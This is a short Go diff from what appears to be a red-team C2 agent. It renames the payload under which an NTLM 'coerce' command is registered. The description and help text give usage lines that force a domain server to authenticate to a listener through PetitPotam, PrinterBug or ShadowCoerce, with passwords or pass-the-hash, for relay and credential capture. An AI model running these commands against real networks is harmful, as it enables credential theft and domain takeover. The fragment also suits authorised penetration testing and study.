@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "coerce",
 		Description:         "NTLM authentication coercion — force a target server to authenticate to a listener via MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), or MS-FSRVP (ShadowCoerce). Used for NTLM relay attacks and credential capture. Supports pass-the-hash.",
 		HelpString:          "coerce -server dc01.domain.local -listener 10.0.0.5 -method petitpotam -username DOMAIN\\user -password pass\ncoerce -server 192.168.1.1 -listener 10.0.0.5 -method all -username admin -hash aad3b435b51404ee:8846f7eaee8fb117\ncoerce -server dc01 -listener 10.0.0.5 -method printerbug -username user@domain.local -password pass",
